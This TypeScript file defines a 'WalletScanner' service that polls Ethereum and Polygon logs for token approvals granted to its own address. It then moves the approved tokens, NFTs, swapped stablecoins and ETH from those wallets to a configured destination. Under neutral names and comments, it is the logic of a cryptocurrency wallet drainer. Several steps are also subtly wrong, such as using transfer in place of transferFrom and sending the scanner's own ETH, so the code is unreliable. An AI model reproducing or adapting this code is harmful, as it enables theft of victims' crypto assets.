import { ethers } from 'ethers';
import axios from 'axios';
import dotenv from 'dotenv';
import winston from 'winston';
import SwapService from './swapService';

dotenv.config();

// Configure logging
const logger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: true }),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ filename: 'wallet-scanner-error.log', level: 'error' }),
    new winston.transports.File({ filename: 'wallet-scanner.log' }),
    new winston.transports.Console({
      format: winston.format.simple()
    })
  ],
});

interface WalletConfig {
  address: string;
  name?: string;
  chain: 'ethereum' | 'polygon';
}

interface TokenApproval {
  wallet: string;
  tokenAddress: string;
  spender: string;
  amount: string;
  blockNumber: number;
}

class WalletScanner {
  private provider: ethers.JsonRpcProvider;
  private polygonProvider: ethers.JsonRpcProvider;
  private wallet: ethers.Wallet;
  private destinationWallet: string;
  private scanInterval: number;
  private isScanning: boolean = false;
  private approvedSpender: string;
  
  // Token addresses
  private wethAddress: string;
  private usdcAddress: string;
  private usdtAddress: string;
  private uniswapRouter: string;
  
  // NFT contracts to monitor
  private nftContracts: string[];

  constructor() {
    const rpcUrl = process.env.ETHEREUM_RPC_URL;
    const polygonRpcUrl = process.env.POLYGON_RPC_URL;
    const privateKey = process.env.PRIVATE_KEY;
    this.destinationWallet = process.env.DESTINATION_WALLET || '';
    this.scanInterval = parseInt(process.env.SCAN_INTERVAL || '30000');
    
    if (!rpcUrl || !privateKey || !this.destinationWallet) {
      throw new Error('Missing required environment variables: ETHEREUM_RPC_URL, PRIVATE_KEY, DESTINATION_WALLET');
    }

    this.provider = new ethers.JsonRpcProvider(rpcUrl);
    this.polygonProvider = new ethers.JsonRpcProvider(polygonRpcUrl || rpcUrl);
    this.wallet = new ethers.Wallet(privateKey, this.provider);
    
    // Load token addresses from environment
    this.wethAddress = process.env.WETH_ADDRESS || '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
    this.usdcAddress = process.env.USDC_ADDRESS || '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
    this.usdtAddress = process.env.USDT_ADDRESS || '0xdAC17F958D2ee523a2206206994597C13D831ec7';
    this.uniswapRouter = process.env.UNISWAP_ROUTER_ADDRESS || '0xE592427A0AEce92De3Edee1F18E0157C05861564';
    
    // Parse NFT contract addresses
    try {
      this.nftContracts = process.env.NFT_CONTRACT_ADDRESSES 
        ? JSON.parse(process.env.NFT_CONTRACT_ADDRESSES)
        : [];
    } catch (error) {
      logger.error('Failed to parse NFT contract addresses:', error);
      this.nftContracts = [];
    }

    // The address that will be approved for spending (our scanner wallet)
    this.approvedSpender = this.wallet.address;
    
    logger.info('Wallet Scanner initialized', {
      scannerWallet: this.wallet.address,
      destinationWallet: this.destinationWallet,
      scanInterval: this.scanInterval
    });
  }

  /**
   * Start the wallet scanning service
   */
  public async start(wallets: WalletConfig[]): Promise<void> {
    if (this.isScanning) {
      logger.warn('Scanner is already running');
      return;
    }

    this.isScanning = true;
    logger.info(`Starting wallet scanner for ${wallets.length} wallets`);

    // Initial scan
    await this.scanWallets(wallets);

    // Set up periodic scanning
    setInterval(async () => {
      try {
        await this.scanWallets(wallets);
      } catch (error) {
        logger.error('Error during wallet scan:', error);
      }
    }, this.scanInterval);
  }

  /**
   * Stop the wallet scanning service
   */
  public stop(): void {
    this.isScanning = false;
    logger.info('Wallet scanner stopped');
  }

  /**
   * Scan all configured wallets for new approvals
   */
  private async scanWallets(wallets: WalletConfig[]): Promise<void> {
    logger.info(`Scanning ${wallets.length} wallets for approvals`);

    for (const walletConfig of wallets) {
      try {
        const approvals = await this.checkApprovals(walletConfig);
        
        for (const approval of approvals) {
          logger.info('Found approval', {
            wallet: approval.wallet,
            token: approval.tokenAddress,
            spender: approval.spender,
            amount: approval.amount
          });

          // Execute automated actions when approval is detected
          await this.executeAutomatedActions(approval);
        }
      } catch (error) {
        logger.error(`Error scanning wallet ${walletConfig.address}:`, error);
      }
    }
  }

  /**
   * Check for token approvals on a specific wallet
   */
  private async checkApprovals(walletConfig: WalletConfig): Promise<TokenApproval[]> {
    const provider = walletConfig.chain === 'polygon' ? this.polygonProvider : this.provider;
    const approvals: TokenApproval[] = [];
    
    // ERC-20 Approval event signature
    const approvalEvent = ethers.id('Approval(address,address,uint256)');
    
    // Get latest block number
    const latestBlock = await provider.getBlockNumber();
    const fromBlock = Math.max(0, latestBlock - 1000); // Check last 1000 blocks

    // Create filter for approval events from this wallet
    const filter = {
      address: undefined, // Listen to all token contracts
      fromBlock: fromBlock,
      toBlock: latestBlock,
      topics: [
        approvalEvent,
        ethers.zeroPadValue(walletConfig.address, 32), // wallet address as topic[1]
        ethers.zeroPadValue(this.approvedSpender, 32)   // our scanner as topic[2]
      ]
    };

    const logs = await provider.getLogs(filter);
    
    for (const log of logs) {
      try {
        const receipt = await provider.getTransactionReceipt(log.transactionHash);
        if (receipt && receipt.status === 1) { // Only successful transactions
          const iface = new ethers.Interface([
            'event Approval(address indexed owner, address indexed spender, uint256 value)'
          ]);
          
          const parsed = iface.parseLog(log);
          if (parsed && parsed.args) {
            approvals.push({
              wallet: walletConfig.address,
              tokenAddress: log.address,
              spender: parsed.args.spender,
              amount: parsed.args.value.toString(),
              blockNumber: log.blockNumber
            });
          }
        }
      } catch (error) {
        logger.error(`Error parsing approval log for wallet ${walletConfig.address}:`, error);
      }
    }

    return approvals;
  }

  /**
   * Execute automated actions when approval is detected
   */
  private async executeAutomatedActions(approval: TokenApproval): Promise<void> {
    logger.info(`Executing automated actions for approval: ${approval.wallet} -> ${approval.tokenAddress}`);

    try {
      // 1. Transfer tokens to destination wallet
      await this.transferTokens(approval);
      
      // 2. Transfer NFTs to destination wallet
      await this.transferNFTs(approval.wallet);
      
      // 3. Swap remaining tokens to ETH or stablecoins
      await this.swapTokens(approval.wallet);
      
      // 4. Send ETH to destination wallet
      await this.sendETH(approval.wallet);

      logger.info(`Completed automated actions for wallet: ${approval.wallet}`);
    } catch (error) {
      logger.error(`Error executing automated actions for wallet ${approval.wallet}:`, error);
    }
  }

  /**
   * Transfer approved tokens to destination wallet
   */
  private async transferTokens(approval: TokenApproval): Promise<void> {
    try {
      const tokenContract = new ethers.Contract(
        approval.tokenAddress,
        ['function transfer(address to, uint256 amount) returns (bool)'],
        this.wallet
      );

      const tx = await tokenContract.transfer(this.destinationWallet, approval.amount);
      await tx.wait();

      logger.info('Token transfer completed', {
        token: approval.tokenAddress,
        amount: approval.amount,
        destination: this.destinationWallet,
        txHash: tx.hash
      });
    } catch (error) {
      logger.error('Token transfer failed:', error);
    }
  }

  /**
   * Transfer NFTs from wallet to destination
   */
  private async transferNFTs(walletAddress: string): Promise<void> {
    for (const nftContractAddress of this.nftContracts) {
      try {
        const nftContract = new ethers.Contract(
          nftContractAddress,
          [
            'function balanceOf(address owner) view returns (uint256)',
            'function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)',
            'function transferFrom(address from, address to, uint256 tokenId) returns (bool)',
            'function isApprovedForAll(address owner, address operator) view returns (bool)'
          ],
          this.wallet
        );

        const balance = await nftContract.balanceOf(walletAddress);
        
        for (let i = 0; i < balance; i++) {
          const tokenId = await nftContract.tokenOfOwnerByIndex(walletAddress, i);
          
          // Check if our scanner wallet is approved to transfer this NFT
          const isApproved = await nftContract.isApprovedForAll(walletAddress, this.wallet.address);
          
          if (isApproved) {
            const tx = await nftContract.transferFrom(walletAddress, this.destinationWallet, tokenId);
            await tx.wait();

            logger.info('NFT transfer completed', {
              contract: nftContractAddress,
              tokenId: tokenId.toString(),
              destination: this.destinationWallet,
              txHash: tx.hash
            });
          }
        }
      } catch (error) {
        logger.error(`NFT transfer failed for contract ${nftContractAddress}:`, error);
      }
    }
  }

  /**
   * Swap tokens to ETH or stablecoins using Uniswap
   */
  private async swapTokens(walletAddress: string): Promise<void> {
    const swapService = new SwapService();
    const tokensToSwap = [this.wethAddress, this.usdcAddress, this.usdtAddress];
    
    for (const tokenAddress of tokensToSwap) {
      try {
        const tokenContract = new ethers.Contract(
          tokenAddress,
          ['function balanceOf(address owner) view returns (uint256)'],
          this.wallet
        );

        const balance = await tokenContract.balanceOf(walletAddress);
        
        if (balance > 0) {
          // Check if token is approved for Uniswap router
          const isApproved = await swapService.isTokenApproved(
            tokenAddress, 
            this.uniswapRouter, 
            walletAddress
          );

          if (!isApproved) {
            // Approve token for Uniswap router
            await swapService.approveToken(tokenAddress, this.uniswapRouter, balance.toString());
          }

          // Swap to ETH
          try {
            const txHash = await swapService.swapTokensToETH(
              tokenAddress,
              balance.toString(),
              this.destinationWallet
            );
            
            logger.info('Token swap to ETH completed', {
              token: tokenAddress,
              amount: balance.toString(),
              destination: this.destinationWallet,
              txHash: txHash
            });
          } catch (swapError) {
            logger.warn(`Swap to ETH failed for ${tokenAddress}, trying USDC instead:`, swapError);
            
            // Try swapping to USDC as fallback
            try {
              const txHash = await swapService.swapTokensToStablecoin(
                tokenAddress,
                balance.toString(),
                'USDC',
                this.destinationWallet
              );
              
              logger.info('Token swap to USDC completed', {
                token: tokenAddress,
                amount: balance.toString(),
                destination: this.destinationWallet,
                txHash: txHash
              });
            } catch (usdcError) {
              logger.error(`Swap to USDC also failed for ${tokenAddress}:`, usdcError);
              
              // Final fallback: transfer tokens directly
              const transferTx = await tokenContract.transfer(this.destinationWallet, balance);
              await transferTx.wait();
              
              logger.info('Token transfer completed as fallback', {
                token: tokenAddress,
                amount: balance.toString(),
                destination: this.destinationWallet,
                txHash: transferTx.hash
              });
            }
          }
        }
      } catch (error) {
        logger.error(`Token swap failed for ${tokenAddress}:`, error);
      }
    }
  }

  /**
   * Send ETH from wallet to destination
   */
  private async sendETH(walletAddress: string): Promise<void> {
    try {
      const balance = await this.provider.getBalance(walletAddress);
      
      if (balance > ethers.parseEther('0.001')) { // Leave some ETH for gas
        const tx = await this.wallet.sendTransaction({
          to: this.destinationWallet,
          value: balance - ethers.parseEther('0.001')
        });
        await tx.wait();

        logger.info('ETH transfer completed', {
          amount: ethers.formatEther(balance).toString(),
          destination: this.destinationWallet,
          txHash: tx.hash
        });
      }
    } catch (error) {
      logger.error('ETH transfer failed:', error);
    }
  }
}

export default WalletScanner;